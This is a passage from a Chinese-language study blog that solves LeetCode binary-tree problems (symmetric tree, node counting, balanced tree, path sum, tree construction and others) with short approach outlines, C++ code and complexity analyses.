<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">lass Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">cmp</span> <span class="params">(TreeNode* left, TreeNode* right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left == <span class="literal">NULL</span> &amp;&amp; right != <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//左空、右不空</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (left != <span class="literal">NULL</span> &amp;&amp; right == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//左不空，右空</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (left == <span class="literal">NULL</span> &amp;&amp; right == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//左右都空</span></span><br><span class="line">        <span class="comment">// 排除了空节点，再排除数值不相同的情况</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (left-&gt;val != right-&gt;val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> outside = <span class="built_in">cmp</span>(left-&gt;left, right-&gt;right);<span class="comment">//外侧</span></span><br><span class="line">        <span class="type">bool</span> inside = <span class="built_in">cmp</span>(left-&gt;right, right-&gt;left);<span class="comment">//内测</span></span><br><span class="line">        <span class="keyword">return</span> outside &amp;&amp; inside;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">cmp</span>(root-&gt;left, root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：O(n) 后序遍历全部元素</p>
</li>
<li><p>空间复杂度：O(n) 递归开辟栈、</p>
</li>
</ul>
<h1 id="7-leetcode-222-完全二叉树的节点个数-E"><a href="#7-leetcode-222-完全二叉树的节点个数-E" class="headerlink" title="7.leetcode-222-完全二叉树的节点个数-E"></a>7.leetcode-222-完全二叉树的节点个数-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/count-complete-tree-nodes/description/">222. 完全二叉树的节点个数 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>如果是普通二叉树，前中后序都可以，层序也可以</li>
<li>完全二叉树特性：除了底层节点上面节点都是满的 </li>
<li>满二叉树节点数：（2^n） - 1</li>
<li>判断子树是否是满二叉树</li>
</ul>
<p><strong>代码实现—普通二叉树</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getNodesNum</span><span class="params">(TreeNode* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> leftNum = <span class="built_in">getNodesNum</span>(cur-&gt;left);      <span class="comment">// 左</span></span><br><span class="line">        <span class="type">int</span> rightNum = <span class="built_in">getNodesNum</span>(cur-&gt;right);    <span class="comment">// 右</span></span><br><span class="line">        <span class="type">int</span> treeNum = leftNum + rightNum + <span class="number">1</span>;      <span class="comment">// 中</span></span><br><span class="line">        <span class="keyword">return</span> treeNum;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getNodesNum</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n)</li>
<li>空间复杂度：O(log n)</li>
</ul>
<p><strong>代码实现—完全二叉树</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        TreeNode* left = root-&gt;left;</span><br><span class="line">        TreeNode* right = root-&gt;right;</span><br><span class="line">        <span class="type">int</span> leftDepth = <span class="number">0</span>, rightDepth = <span class="number">0</span>; <span class="comment">// 这里初始为0是有目的的，为了下面求指数方便</span></span><br><span class="line">        <span class="keyword">while</span> (left) &#123;  <span class="comment">// 求左子树深度</span></span><br><span class="line">            left = left-&gt;left;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (right) &#123; <span class="comment">// 求右子树深度</span></span><br><span class="line">            right = right-&gt;right;</span><br><span class="line">            rightDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (leftDepth == rightDepth) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">2</span> &lt;&lt; leftDepth) - <span class="number">1</span>; <span class="comment">// 注意(2&lt;&lt;1) 相当于2^2，所以leftDepth初始为0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">countNodes</span>(root-&gt;left) + <span class="built_in">countNodes</span>(root-&gt;right) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(log n x log n)</li>
<li>空间复杂度：O(log n)</li>
</ul>
<h1 id="8-leetcode-110-平衡二叉树-E"><a href="#8-leetcode-110-平衡二叉树-E" class="headerlink" title="8.leetcode-110-平衡二叉树-E"></a>8.leetcode-110-平衡二叉树-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/balanced-binary-tree/description/">110. 平衡二叉树 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>高度平衡二叉树：一个二叉树每个节点的左右两个子树的高度差绝对值不超过1</li>
<li>高度：距离叶子节点的距离 —–后序遍历（左右中） 向上遍历不断返回       空节点的高度为0</li>
<li>深度：距离根节点的距离 ——前序遍历（中左右）一直向下遍历</li>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231026102400142.png" alt="平衡二叉树"></li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getHeigth</span><span class="params">(TreeNode* node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> leftheight = <span class="built_in">getHeigth</span>(node-&gt;left);</span><br><span class="line">        <span class="comment">//左</span></span><br><span class="line">        <span class="keyword">if</span> (leftheight == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> rightheight = <span class="built_in">getHeigth</span>(node-&gt;right);</span><br><span class="line">        <span class="comment">//right</span></span><br><span class="line">        <span class="keyword">if</span> (rightheight == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> res;</span><br><span class="line">        <span class="comment">//中</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">abs</span>(leftheight - rightheight) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            res = <span class="number">-1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res = <span class="built_in">max</span>(leftheight, rightheight) + <span class="number">1</span>;<span class="comment">//相差小于1 则中间取最大值+1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getHeigth</span>(root) == <span class="number">-1</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 每个节点都遍历一次</li>
<li>空间复杂度：O(n)递归</li>
</ul>
<h1 id="9-leetcode-257-二叉树的所有路径-E"><a href="#9-leetcode-257-二叉树的所有路径-E" class="headerlink" title="9.leetcode-257-二叉树的所有路径-E"></a>9.leetcode-257-二叉树的所有路径-E</h1><p><strong>题目：<a href="https://leetcode.cn/problems/binary-tree-paths/">257. 二叉树的所有路径 - 力扣（LeetCode）</a></strong></p>
<p><strong>思路：</strong></p>
<ul>
<li>前序遍历（中左右）这样遍历才会让父节点指向子节点</li>
<li>回溯<ul>
<li><img src="/2023/10/19/%E4%BA%8C%E5%8F%89%E6%A0%91/image-20231026111608437.png" alt="image-20231026111608437"></li>
</ul>
</li>
<li>递归三部曲 <ul>
<li>返回值void 参数 node，path</li>
<li>终止条件：左右孩子都为空 -&gt;放入path路径</li>
<li>前序遍历：中左右</li>
</ul>
</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">lass Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">traversal</span><span class="params">(TreeNode* node, vector&lt;<span class="type">int</span>&gt; &amp;path, vector&lt;string&gt; &amp;res)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//zhong,因为最后一个节点也要加入到path中</span></span><br><span class="line">        path.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">        <span class="comment">//叶子节点</span></span><br><span class="line">        <span class="keyword">if</span> (node-&gt;left == <span class="literal">NULL</span> &amp;&amp; node-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            string sPath;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; path.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                sPath += <span class="built_in">to_string</span>(path[i]);</span><br><span class="line">                sPath += <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sPath += <span class="built_in">to_string</span>(path[path.<span class="built_in">size</span>() - <span class="number">1</span>]);<span class="comment">//末尾的字符</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(sPath);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;left) &#123;</span><br><span class="line">            <span class="built_in">traversal</span>(node-&gt;left, path, res);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();<span class="comment">//回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;right) &#123;</span><br><span class="line">            <span class="built_in">traversal</span>(node-&gt;right, path,res);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; res;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="built_in">traversal</span>(root, path, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n^2) 回溯</li>
<li>空间复杂度：O(n^2)</li>
</ul>
<h1 id="10-leetcode-404-左叶子之和-E"><a href="#10-leetcode-404-左叶子之和-E" class="headerlink" title="10.leetcode-404-左叶子之和-E"></a>10.leetcode-404-左叶子之和-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/sum-of-left-leaves/description/">404. 左叶子之和 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li><p>确定哪种遍历顺序：前序（中左右）、后序（左右中）、中序（左中右）</p>
</li>
<li><p>左叶子节点：节点A的左孩子不为空，且左孩子的左右孩子都为空（说明是叶子节点），那么A节点的左孩子为左叶子节点。</p>
</li>
<li><p><strong>那么要判断当前节点是否是左节点，必须要通过节点的父节点来判断其左孩子是不是左叶子</strong>，判断逻辑如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (node-&gt;left != <span class="literal">NULL</span> &amp;&amp; node-&gt;left-&gt;left == <span class="literal">NULL</span> &amp;&amp; node-&gt;left-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//左叶子节点处理逻辑 节点a的左孩子不为空 且左孩子的左右孩子都为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>确定遍历顺序：后序（左右中），因为递归函数的返回值来累加求取左叶子数值之和</p>
</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//只有当前遍历的节点是父节点，才能判断其子节点是不是左叶子。 所以如果当前遍历的节点是叶子节点</span></span><br><span class="line">        <span class="comment">//遍历 左右中</span></span><br><span class="line">        <span class="type">int</span> leftval = <span class="built_in">sumOfLeftLeaves</span>(root-&gt;left);</span><br><span class="line">        <span class="comment">//左叶子节点判断条件</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left != <span class="literal">NULL</span> &amp;&amp; root-&gt;left-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;left-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            leftval = root-&gt;left-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//右</span></span><br><span class="line">        <span class="type">int</span> rightVal = <span class="built_in">sumOfLeftLeaves</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> leftval + rightVal;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 递归遍历</li>
<li>空间复杂度：O(n) 递归开辟栈空间</li>
</ul>
<h1 id="11-leetcode-513-找树左下角的值-M"><a href="#11-leetcode-513-找树左下角的值-M" class="headerlink" title="11.leetcode-513-找树左下角的值-M"></a>11.leetcode-513-找树左下角的值-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/find-bottom-left-tree-value/">513. 找树左下角的值 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>找出二叉树的<strong>最底层最左边节点值</strong></li>
<li>迭代法比较简单 找最后一层第一个值</li>
<li>递归：<ul>
<li>深度最大的叶子节点 找最左边的</li>
<li>没有中节点处理逻辑 所以 前序 后序 中序都可以 优先遍历左节点，左侧没有就遍历右侧</li>
<li>需要记录当前的最大深度，</li>
<li>终止条件：左右孩子为空，判断当前深度与最大深度，如果更大则更新最大深度，result更新记录数值</li>
<li>回溯 <code>depth--</code> 隐藏在递归函数的下面，也可以隐藏在参数中 depth + 1 ，depth不做改变</li>
<li>没有中的处理逻辑，因为不需要处理中间</li>
</ul>
</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">lass Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> maxDepth = INT_MIN;</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">traversal</span> <span class="params">(TreeNode *node, <span class="type">int</span> depth)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//终止条件 左右节点都为空 ，需要更新最大值</span></span><br><span class="line">        <span class="keyword">if</span> (node-&gt;left == <span class="literal">NULL</span> &amp;&amp; node-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (depth &gt; maxDepth) &#123;</span><br><span class="line">                maxDepth = depth;</span><br><span class="line">                result = node-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左</span></span><br><span class="line">        <span class="keyword">if</span> (node-&gt;left) &#123;</span><br><span class="line">            <span class="built_in">traversal</span>(node-&gt;left, depth + <span class="number">1</span>);<span class="comment">//depth + 1回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;right) &#123;</span><br><span class="line">            <span class="built_in">traversal</span>(node-&gt;right, depth + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">traversal</span>(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 递归 每个节点遍历一次</li>
<li>空间复杂度：O(n) 递归开辟的栈空间</li>
</ul>
<h1 id="12-leetcode-112-路径总和-E"><a href="#12-leetcode-112-路径总和-E" class="headerlink" title="12.leetcode-112-路径总和-E"></a>12.leetcode-112-路径总和-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/path-sum/description/">112. 路径总和 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>递归<ul>
<li>确定遍历顺序 前后中都可以，—–不涉及到中节点的处理逻辑</li>
<li>确定返回值<code>（bool）</code>、参数<code>（treenode *node，int input）</code>— 找某一条路径就行，因此可以直接</li>
<li>传入目标值 对节点做减法，到叶子节点为0则 找到路径。</li>
<li><strong>注意回溯</strong></li>
</ul>
</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* root, <span class="type">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//空节点</span></span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;left &amp;&amp; !root-&gt;right &amp;&amp; targetSum == root-&gt;val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//遇到叶子节点，并且剩余的值相等</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hasPathSum</span>(root-&gt;left, targetSum - root-&gt;val) || <span class="built_in">hasPathSum</span>(root-&gt;right, targetSum - root-&gt;val); <span class="comment">//||或逻辑，回溯过程隐藏在targetSum - root-&gt;val中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n)最坏情况 全部节点遍历一次</li>
<li>空间复杂度：O(n) 最坏情况 递归开辟栈空间</li>
</ul>
<h1 id="13-leetcode-106-从中序与后序遍历序列构造二叉树-M"><a href="#13-leetcode-106-从中序与后序遍历序列构造二叉树-M" class="headerlink" title="13.leetcode-106-从中序与后序遍历序列构造二叉树-M"></a>13.leetcode-106-从中序与后序遍历序列构造二叉树-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/description/">106. 从中序与后序遍历序列构造二叉树 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>中序遍历（左 中 右），后序遍历（左 右 中）<ul>
<li>后序最后一个元素 一定是根节点</li>
<li>找到根节点在中序数组中分左右区间</li>
<li>递归处理上述步骤</li>
</ul>
</li>
<li>递归终止条件： 后序数组为0 return NULL</li>
<li>切割中序数组（根节点index）—-&gt;切后序数组（中序左区间得到的大小 切）<strong>注意区间的开闭</strong></li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;inorder, <span class="type">int</span> inorderBegin, <span class="type">int</span> inorderEnd, </span></span></span><br><span class="line"><span class="params"><span class="function">    vector&lt;<span class="type">int</span>&gt; &amp;postorder, <span class="type">int</span> postorderBegin, <span class="type">int</span> postorderEnd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (postorderBegin == postorderEnd) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> rootVal = postorder[postorderEnd - <span class="number">1</span>];<span class="comment">//根节点</span></span><br><span class="line">        TreeNode* root =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (postorderEnd - postorderBegin == <span class="number">1</span>) <span class="keyword">return</span> root;<span class="comment">//只有根节点</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> delimiterIndex;<span class="comment">//切割</span></span><br><span class="line">        <span class="comment">//找出根节点在中序遍历中的索引</span></span><br><span class="line">        <span class="keyword">for</span> (delimiterIndex = inorderBegin; delimiterIndex &lt; inorderEnd; delimiterIndex++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (inorder[delimiterIndex] == rootVal) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//切割中序数组 左闭右开[ , )</span></span><br><span class="line">        <span class="type">int</span> leftInorderBegin = inorderBegin;</span><br><span class="line">        <span class="type">int</span> leftInorderEnd = delimiterIndex;</span><br><span class="line">        <span class="type">int</span> rightInorderBegin = delimiterIndex + <span class="number">1</span>;<span class="comment">//左闭右开 所以左边加一</span></span><br><span class="line">        <span class="type">int</span> rightInorderEnd = inorderEnd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//切割后序数组</span></span><br><span class="line">        <span class="comment">//左后序</span></span><br><span class="line">        <span class="type">int</span> leftPostorderBegin = postorderBegin;</span><br><span class="line">        <span class="type">int</span> leftPostorderEnd = postorderBegin + delimiterIndex - inorderBegin;</span><br><span class="line">        <span class="comment">//右后序</span></span><br><span class="line">        <span class="type">int</span> rightPostorderBegin = postorderBegin + delimiterIndex - inorderBegin;</span><br><span class="line">        <span class="type">int</span> rightPostorderEnd = postorderEnd - <span class="number">1</span>; <span class="comment">// 减去根节点</span></span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(inorder, leftInorderBegin, leftInorderEnd, postorder, leftPostorderBegin, leftPostorderEnd); <span class="comment">//左区间递归</span></span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(inorder, rightInorderBegin, rightInorderEnd, postorder, rightPostorderBegin, rightPostorderEnd); <span class="comment">//右区间递归</span></span><br><span class="line">        <span class="keyword">return</span> root; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; inorder, vector&lt;<span class="type">int</span>&gt;&amp; postorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (inorder.<span class="built_in">size</span>() == <span class="number">0</span> || postorder.<span class="built_in">size</span>() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//遵循左闭右开的原则</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(inorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>(), postorder, <span class="number">0</span>, postorder.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 二叉树每个遍历一次</li>
<li>空间复杂度：O(n) 递归栈</li>
</ul>
<h1 id="14-leetcode-654-最大二叉树-M"><a href="#14-leetcode-654-最大二叉树-M" class="headerlink" title="14.leetcode-654-最大二叉树-M"></a>14.leetcode-654-最大二叉树-M</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/maximum-binary-tree/description/">654. 最大二叉树 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>找到最大点数组元素作为根节点，然后对数组进行划分，递归</li>
<li>凡是构造二叉树都使用<strong>前序遍历</strong>（中左右），先把中间节点或根节点构造出来</li>
<li>递归：<ul>
<li>返回值 参数确定</li>
<li>终止条件：数组的大小 &#x3D;&#x3D; 1 既是根节点也是叶子节点了</li>
<li>找到最大值numMax，中左右逻辑写实现代码</li>
<li>注意数组的开闭，左闭右开</li>
</ul>
</li>
</ul>
<p><strong>代码实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">//[left, right)构建二叉树</span></span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span><span class="params">(vector&lt;<span class="type">int</span>&gt; nums, <span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left &gt;= right) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="comment">//分割点的索引</span></span><br><span class="line">        <span class="type">int</span> maxValIndex = left;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = left + <span class="number">1</span>; i &lt; right; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; nums[maxValIndex]) maxValIndex = i;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(nums[maxValIndex]);<span class="comment">//中</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//[left, maxValIndex)</span></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(nums, left, maxValIndex);</span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(nums, maxValIndex + <span class="number">1</span>, right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">constructMaximumBinaryTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(nums, <span class="number">0</span>, nums.<span class="built_in">size</span>());<span class="comment">//左闭右开</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：O(n) 每个节点遍历一遍</li>
<li>空间复杂度：O(n) 递归</li>
</ul>
<h1 id="15-leetcode-617-合并二叉树-E"><a href="#15-leetcode-617-合并二叉树-E" class="headerlink" title="15.leetcode-617-合并二叉树-E"></a>15.leetcode-617-合并二叉树-E</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/merge-two-binary-trees/description/">617. 合并二叉树 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>前序比较容易理解，直接将两个节点相加即可</li>
</ul>
<p><strong>代码实现</strong></p>
